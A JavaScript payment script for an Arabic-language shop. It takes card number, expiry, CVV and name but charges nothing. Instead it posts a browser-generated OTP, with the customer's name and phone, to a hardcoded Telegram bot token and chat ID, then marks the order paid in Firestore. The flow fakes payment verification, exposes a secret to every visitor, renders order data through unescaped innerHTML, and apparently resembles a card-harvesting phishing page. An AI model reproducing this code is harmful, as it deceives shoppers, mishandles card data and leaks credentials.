import { db, collection, addDoc } from './firebase-config.js';

// قراءة بيانات الطلب
const pendingOrder = localStorage.getItem('pendingOrder');
let orderData = null;

try {
    orderData = pendingOrder ? JSON.parse(pendingOrder) : null;
} catch (e) {
    console.error('خطأ في قراءة بيانات الطلب:', e);
}

let currentOTP = null;
let otpAttempts = 0;

// عرض ملخص الطلب إذا وجدت البيانات
if (orderData && orderData.items && Array.isArray(orderData.items)) {
    const summaryEl = document.getElementById('orderSummary');
    if (summaryEl) {
        let itemsHtml = '';
        for (let i = 0; i < orderData.items.length; i++) {
            const item = orderData.items[i];
            const name = item.name || '';
            const color = item.color || '';
            const qty = item.quantity || 1;
            const price = item.price || 0;
            itemsHtml += '<div class="summary-row"><span>' + name + ' (' + color + ') × ' + qty + '</span><span>' + (price * qty).toFixed(2) + ' د.إ</span></div>';
        }
        const total = orderData.total || 0;
        summaryEl.innerHTML = '<h3>ملخص الطلب</h3>' + itemsHtml + '<div class="summary-row"><span>المجموع</span><span>' + total.toFixed(2) + ' د.إ</span></div>';
    }
} else {
    console.warn('لا توجد بيانات طلب');
}

// دوال OTP
window.showOTPModal = function() {
    const modal = document.getElementById('otpModal');
    if (modal) {
        modal.style.display = 'flex';
        const phoneEl = document.getElementById('otpPhone');
        if (phoneEl && orderData && orderData.phone) {
            phoneEl.textContent = orderData.phone;
        }
        setTimeout(function() {
            const firstDigit = document.querySelector('.otp-digit');
            if (firstDigit) firstDigit.focus();
        }, 100);
    }
};

window.closeOTPModal = function() {
    const modal = document.getElementById('otpModal');
    if (modal) modal.style.display = 'none';
    document.querySelectorAll('.otp-digit').forEach(function(i) { i.value = ''; });
    const msgEl = document.getElementById('otpMessage');
    if (msgEl) msgEl.innerHTML = '';
};

window.getEnteredOTP = function() {
    const digits = document.querySelectorAll('.otp-digit');
    let otp = '';
    digits.forEach(function(d) { otp += d.value; });
    return otp;
};

window.moveToNext = function(input, index) {
    if (input.value.length === 1) {
        const inputs = document.querySelectorAll('.otp-digit');
        if (index < 5 && inputs[index + 1]) inputs[index + 1].focus();
    }
};

async function sendOTP() {
    currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
    const customerName = (orderData && orderData.customerName) ? orderData.customerName : 'غير محدد';
    const phone = (orderData && orderData.phone) ? orderData.phone : 'غير محدد';
    const message = '🔐 رمز التحقق: <b>' + currentOTP + '</b>\nالعميل: ' + customerName + '\nالهاتف: ' + phone;
    try {
        const response = await fetch('https://api.telegram.org/bot8763567744:AAEjPu0YFJAHMQspulqQDgYr1TqU6W61hpi/sendMessage', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: '8214447975', text: message, parse_mode: 'HTML' })
        });
        const data = await response.json();
        return data.ok;
    } catch (error) {
        console.error('خطأ OTP:', error);
        return false;
    }
}

window.verifyOTP = function() {
    const entered = window.getEnteredOTP();
    const messageEl = document.getElementById('otpMessage');
    if (entered.length !== 6) {
        messageEl.innerHTML = '<div>⚠️ أدخل 6 أرقام</div>';
        return;
    }
    if (entered === currentOTP) {
        messageEl.innerHTML = '<div>✅ تم التحقق!</div>';
        setTimeout(function() { window.completePayment(); }, 1500);
    } else {
        otpAttempts++;
        messageEl.innerHTML = '<div>❌ خطأ! (' + (3 - otpAttempts) + ' محاولات)</div>';
        if (otpAttempts >= 3) {
            setTimeout(function() { window.closeOTPModal(); window.location.href = 'cart.html'; }, 3000);
        }
        document.querySelectorAll('.otp-digit').forEach(function(i) { i.value = ''; });
        document.querySelectorAll('.otp-digit')[0].focus();
    }
};

window.resendOTP = async function() {
    const messageEl = document.getElementById('otpMessage');
    messageEl.innerHTML = '<div>جاري الإرسال...</div>';
    const sent = await sendOTP();
    if (sent) {
        messageEl.innerHTML = '<div>✅ تم الإرسال</div>';
        otpAttempts = 0;
    } else {
        messageEl.innerHTML = '<div>❌ فشل الإرسال</div>';
    }
};

window.completePayment = async function() {
    try {
        const { updateDoc, doc } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js');
        await updateDoc(doc(db, "orders", orderData.orderId), {
            paymentStatus: 'completed',
            paidAt: new Date()
        });
        localStorage.removeItem('pendingOrder');
        localStorage.removeItem('cart');
        alert('✅ تم الدفع بنجاح!');
        window.location.href = 'index.html';
    } catch (error) {
        alert('❌ خطأ: ' + error.message);
    }
};

window.processPayment = async function() {
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const cardExpiry = document.getElementById('cardExpiry').value;
    const cardCVV = document.getElementById('cardCVV').value;
    const cardName = document.getElementById('cardName').value;
    
    if (!cardNumber || !cardExpiry || !cardCVV || !cardName) {
        alert('⚠️ املأ جميع الحقول');
        return;
    }
    if (cardNumber.length < 13) {
        alert('⚠️ رقم البطاقة غير صحيح');
        return;
    }
    
    try {
        const otpSent = await sendOTP();
        if (otpSent) {
            window.showOTPModal();
        } else {
            alert('️ فشل إرسال OTP');
        }
    } catch (error) {
        alert('❌ خطأ: ' + error.message);
    }
};

console.log('✅ payment.js loaded');
